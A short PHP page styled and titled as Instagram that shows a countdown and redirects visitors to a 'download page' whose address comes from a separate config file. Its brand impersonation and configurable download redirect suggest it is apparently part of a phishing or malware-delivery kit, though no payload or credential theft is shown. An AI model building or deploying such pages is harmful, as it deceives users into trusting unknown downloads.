<?php include 'action_config.php'; ?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link rel="icon" type="image/x-icon" href="favicon.png">
    <meta http-equiv="refresh" content="5;url=<?php echo htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8'); ?>">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fafafa;
        }
        .container {
            text-align: center;
            max-width: 450px;
            padding: 40px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3897f0;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            color: #262626;
            font-size: 20px;
            font-weight: 600;
            margin: 20px 0;
        }
        p {
            color: #8e8e8e;
            font-size: 14px;
            line-height: 1.6;
        }
        .countdown {
            color: #3897f0;
            font-size: 16px;
            font-weight: 600;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Redirecting You to Download Page...</h2>
        <p>Please wait while we redirect you.</p>
        <p class="countdown">Redirecting in <span id="timer">5</span> seconds...</p>
    </div>
    
    <script>
    let timeLeft = 5;
    const timerElement = document.getElementById('timer');
    const redirectUrl = '<?php echo addslashes($redirect_url); ?>';
    
    const countdown = setInterval(function() {
        timeLeft--;
        timerElement.textContent = timeLeft;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            window.location.href = redirectUrl;
        }
    }, 1000);
    </script>
</body>
</html>
